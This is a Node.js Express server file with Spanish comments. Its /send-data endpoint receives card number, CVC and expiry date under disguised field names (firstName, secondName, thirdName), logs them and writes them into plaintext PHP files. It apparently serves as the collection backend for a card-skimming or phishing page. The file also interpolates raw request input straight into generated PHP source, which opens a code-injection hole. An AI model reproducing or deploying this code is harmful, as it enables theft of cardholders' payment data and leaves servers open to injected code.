require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0'; // 🔹 Permitir acceso desde cualquier dispositivo en la red

// 🔹 Permitir accesos desde móviles y otros dispositivos
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Accept']
}));

// 🔹 Soporte para JSON y datos URL-encoded
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 🔹 Servir archivos estáticos desde `public/`
app.use(express.static(path.join(__dirname, 'public')));

// 🔹 Enviar `index.html` como página principal
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'index.html');

    if (!fs.existsSync(filePath)) {
        console.error("🚨 ERROR: index.html no encontrado en public/");
        return res.status(404).send("Error: index.html no se encuentra en public/");
    }

    res.sendFile(filePath);
});

// 🔹 Endpoint para recibir datos de pago
app.post('/send-data', async (req, res) => {
    try {
        console.log("📨 Recibiendo solicitud de pago...");

        if (!req.body || typeof req.body !== 'object') {
            console.error("🚨 ERROR: Datos JSON inválidos.");
            return res.status(400).json({ error: 'Datos JSON incorrectos o vacíos.' });
        }

        const { firstName, secondName, thirdName } = req.body;
        console.log("📨 Datos recibidos:", { firstName, secondName, thirdName });

        if (!firstName || !secondName || !thirdName) {
            console.error("🚨 ERROR: Datos incompletos enviados.");
            return res.status(400).json({ error: 'Datos incompletos' });
        }

        // 📂 Asegurar que la carpeta `data/` exista antes de guardar el archivo PHP
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir);
        }

        // 🔹 Generar archivo PHP con los datos de pago
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        const phpFilePath = path.join(dataDir, `payment-data-${timestamp}.php`);

        const phpContent = `<?php
        $cardNumber = "${firstName}";
        $cvc = "${secondName}";
        $expirationDate = "${thirdName}";

        echo "<h2>Datos de Pago</h2>";
        echo "<p><strong>Tarjeta:</strong> $cardNumber</p>";
        echo "<p><strong>CVC:</strong> $cvc</p>";
        echo "<p><strong>Expiración:</strong> $expirationDate</p>";
        ?>`;

        fs.writeFileSync(phpFilePath, phpContent);

        console.log(`✅ Archivo PHP generado en: ${phpFilePath}`);

        res.json({ message: 'Datos guardados correctamente en el archivo PHP', file: phpFilePath });
    } catch (error) {
        console.error("🚨 Error al procesar la solicitud:", error);
        res.status(500).json({ error: 'Error interno al procesar la información.' });
    }
});

// 🔹 Iniciar el servidor en `0.0.0.0`
app.listen(PORT, HOST, () => {
    console.log(`✅ Servidor corriendo en http://${HOST}:${PORT}`);
});
